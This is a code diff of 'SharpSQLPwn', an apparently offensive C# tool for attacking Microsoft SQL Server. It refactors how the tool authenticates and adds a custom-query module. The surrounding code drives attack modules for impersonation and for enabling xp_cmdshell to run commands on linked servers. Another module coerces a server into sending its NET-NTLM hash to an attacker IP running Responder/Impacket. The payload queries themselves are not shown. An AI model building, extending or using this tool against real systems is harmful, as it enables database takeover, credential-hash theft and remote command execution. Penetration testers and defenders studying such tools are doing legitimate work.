@@ -25,23 +25,7 @@ namespace SharpSQLPwn
                 if (string.IsNullOrEmpty(input)) { db = "master"; }
                 else { db = input; }
 
-                String coniString = "Server = " + sqlServ + "; Database = " + db + "; Integrated Security = True;";
-                SqlConnection coni = new SqlConnection(coniString);
-
-                try
-                {
-                    coni.Open();
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("\n[+] Authentication Success!");
-                    Console.ResetColor();
-                }
-                catch
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine("\n[-] Connection or Authentication Failed");
-                    Console.ResetColor();
-                    Environment.Exit(0);
-                }
+                SqlConnection coni = Utilities.Authentication.WindowsAuthenticate(sqlServ, db);
 
                 Utilities.Functions.Recon(coni);
 
@@ -84,7 +68,7 @@ namespace SharpSQLPwn
                 {
                     Console.Write("[Q] Please enter linked SQL server name: ");
                     String linkedsqlserver = Console.ReadLine();
-                    Utilities.Functions.TestLinkedServer(coni, linkedsqlserver, "", "");
+                    Utilities.Functions.LinkedServer(coni, linkedsqlserver, "", "", "");
 
                     Console.Write("\n[Q] Would you like to try get NET-NTLM Hash of remote SQL server? [NOTE: Ensure Responder/Impacket is listening] [y/N]: ");
                     String question4 = Console.ReadLine();
@@ -92,7 +76,7 @@ namespace SharpSQLPwn
                     {
                         Console.Write("[Q] Please enter IP for attacker machine running Responder/Impacket: ");
                         String smb_ip = Console.ReadLine();
-                        Utilities.Functions.TestLinkedServer(coni, linkedsqlserver, smb_ip, "");
+                        Utilities.Functions.LinkedServer(coni, linkedsqlserver, smb_ip, "", "");
                     }
 
                     Console.Write("\n[Q] Would you like to enable xp_cmdshell and execute command on remote SQL server? [y/N]: ");
@@ -102,7 +86,7 @@ namespace SharpSQLPwn
                         Console.Write("[Q] Please enter command to execute on " + linkedsqlserver + ": ");
                         String cmd;
                         cmd = Console.ReadLine();
-                        Utilities.Functions.TestLinkedServer(coni, linkedsqlserver, "", cmd);
+                        Utilities.Functions.LinkedServer(coni, linkedsqlserver, "", cmd, "");
                     }
 
                 }
@@ -115,29 +99,47 @@ namespace SharpSQLPwn
 
             if (arguments.sqlServer == "LocalMachine") { arguments.sqlServer = System.Environment.MachineName;}
 
-            String conString = "Server = " + arguments.sqlServer + "; Database = " + arguments.database + "; Integrated Security = True;";
-            SqlConnection con = new SqlConnection(conString);
-            try
-            {
-                con.Open();
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine("\n[+] Authentication Success!");
-                Console.ResetColor();
+            SqlConnection con = new SqlConnection();
+            if (arguments.authMethod == "Windows") { con = Utilities.Authentication.WindowsAuthenticate(arguments.sqlServer, arguments.database); }
+            else if (arguments.authMethod == "Local") {
+                if (arguments.username != null && arguments.password != null) {
+                    con = Utilities.Authentication.LocalAuthenticate(arguments.sqlServer, arguments.database, arguments.username, arguments.password);
+                }
+                else
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n[-] Error: Please provide username and password");
+                    Console.ResetColor();
+                    Environment.Exit(0);
+                }
             }
-            catch
+            else if (arguments.authMethod == "Azure") {
+                if (arguments.username != null && arguments.password != null && arguments.domain != null)
+                {
+                    con = Utilities.Authentication.AzureAuthenticate(arguments.sqlServer, arguments.database, arguments.domain, arguments.username, arguments.password);
+                }
+                else
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("\n[-] Error: Please provide domain, username and password");
+                    Console.ResetColor();
+                    Environment.Exit(0);
+                }
+            }
+            else
             {
                 Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine("\n[-] Connection or Authentication Failed");
+                Console.WriteLine("\n[-] Error: Unknown authentication method " + arguments.authMethod);
                 Console.ResetColor();
-                con.Close();
                 Environment.Exit(0);
             }
 
             if (arguments.modules.Contains("R")) { Utilities.Functions.Recon(con); }
             if (arguments.modules.Contains("I")) { Utilities.Functions.Impersonate(con, arguments.impersonatedUser); }
+            if (arguments.modules.Contains("Q")) { Utilities.Functions.QuerySQL(con, arguments.customQuery, true); }
             if (arguments.modules.Contains("C")) { Utilities.Functions.CmdExec(con, arguments.cmdExecTechnique, arguments.cmdExecCommand); }
             if (arguments.modules.Contains("U")) { Utilities.Functions.UNCPathInjection(con, arguments.attackerIP); }
-            if (arguments.modules.Contains("L")) { Utilities.Functions.TestLinkedServer(con, arguments.linkedSQLServer, arguments.attackerIP, arguments.cmdExecCommand); }
+            if (arguments.modules.Contains("L")) { Utilities.Functions.LinkedServer(con, arguments.linkedSQLServer, arguments.attackerIP, arguments.cmdExecCommand, arguments.customQuery); }
 
             con.Close();
             Console.ForegroundColor = ConsoleColor.Green;
